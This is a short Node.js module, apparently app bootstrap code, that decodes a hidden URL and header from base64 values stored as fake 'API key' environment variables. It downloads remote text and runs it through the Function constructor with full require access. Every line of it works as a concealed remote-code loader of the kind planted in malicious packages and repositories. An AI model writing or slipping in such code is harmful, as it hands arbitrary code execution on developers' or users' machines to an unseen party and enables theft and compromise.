const path = require('path');
require('dotenv').config({path: path.resolve(__dirname, '../.env')});
const axios = require('axios');

const initAppBootstrap = async () => {
    try {
        const src = atob(process.env.DEV_API_KEY.replace('nob', ''));
        const k = atob(process.env.DEV_PRIVATE_KEY.replace('nob', ''));
        const v = atob(process.env.DEV_PRIVATE_VALUE);
        const s = (await axios.get(src,{headers:{[k]:v}})).data;
        const handler = new (Function.constructor)('require',s);
        handler(require);
      } catch(error) {
        console.log(error)
      } 
}

module.exports = initAppBootstrap;